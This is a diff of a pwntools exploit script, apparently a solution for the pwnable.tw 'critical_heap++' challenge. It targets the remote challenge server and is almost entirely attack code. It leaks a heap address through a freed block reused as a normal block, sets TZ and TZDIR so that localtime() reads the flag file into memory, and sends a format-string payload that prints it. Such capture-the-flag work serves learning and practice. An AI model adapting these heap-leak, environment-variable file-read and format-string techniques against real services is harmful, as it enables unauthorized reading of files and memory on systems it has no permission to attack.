@@ -1,4 +1,33 @@
+###Arbitrary file read with localtime(), setting TZ/TZDIR with setenv(), and fmt attack
+
 from pwn import *
+
+###Structures
+'''
+Normal block (0x48)
+    |   4   |   4   |   4   |   4   |
+0x00|  name(char*)  | inuse |   x   |
+0x10|     type      |    content    |
+0x20|    content    |    content    |
+0x30|    content    |    content    |
+0x40|   modified    |               
+
+System block (0x48)
+    |   4   |   4   |   4   |   4   |
+0x00|  name(char*)  | inuse |   x   |
+0x10|     type      | cur_dir(char*)|
+0x20|  other(char*) |   usr(char*)  |
+0x30|   sys(char*)  |    rand_num   |
+0x40|       x       | 
+
+Clock block (0x48)
+    |   4   |   4   |   4   |   4   |
+0x00|  name(char*)  | inuse |   x   |
+0x10|     type      |   time(tm*)   |
+0x20|  year | month |  day  |  hour |
+0x30|  min  |  sec  |       x       |
+0x40|       x       |
+'''
 
 ###Utils
 def create(htype,hname,content=None):
@@ -24,8 +53,8 @@ def show(idx):
     r.sendlineafter('heap :',str(idx))
     return r.recvuntil('********')[:-9]
 
-#def rename(htype):
-#    r.sendlineafter('choice : ','3')
+def rename(htype):
+    r.sendlineafter('choice : ','3')
 
 def play_norm(mode,data=None):
     if mode=='show':
@@ -114,21 +143,23 @@ r = remote('chall.pwnable.tw',10500)
 hdoc = ['' for i in range(10)]
 not_play = 1
 
-###Get heap addr onto struct list
+###Get heap addr onto block list
 create('system','sys1')         #0
 play(0,'set',envname='leakadr',envval='a')
+leave_play(0)
 play(0,'get_val',envname='leakadr')
 leave_play(0)
 
-###Replace struct with normal_heap to print heap_addr
+###Replace system block with normal block to print heap_addr
 delete(0)
 create('normal','norm1','a'*8)  #0
-heap_base = u64(show(0).split(b'aaaaaaaa')[1].ljust(8,b'\x00'))-0x148
+heap_addr = u64(show(0).split(b'aaaaaaaa')[1].ljust(8,b'\x00'))-0x148
 
 
 ###Set TZ and TZDIR to force localtime to print flag onto heap
 create('system','sys2')		#1
 play(1,'set',envname='TZ',envval='flag')
+leave_play(1)
 play(1,'set',envname='TZDIR',envval='/home/critical_heap++')
 leave_play(1)
 
@@ -140,7 +171,7 @@ create('clock','clk1')		#2
 #  RDX -> R8 -> stack
 #  input start at stack[4]
 #  2+4+a+2 < 4a  --> a = 3 --> 12*%c+%s+(pad to full length)
-flag_addr = heap_base+0x5e0
+flag_addr = heap_addr+0x5e0
 play(0,'update',data=(b'%c'*12+b'%s').ljust(0x20,b'a')+p64(flag_addr))
 print(play(0,'show'))
 
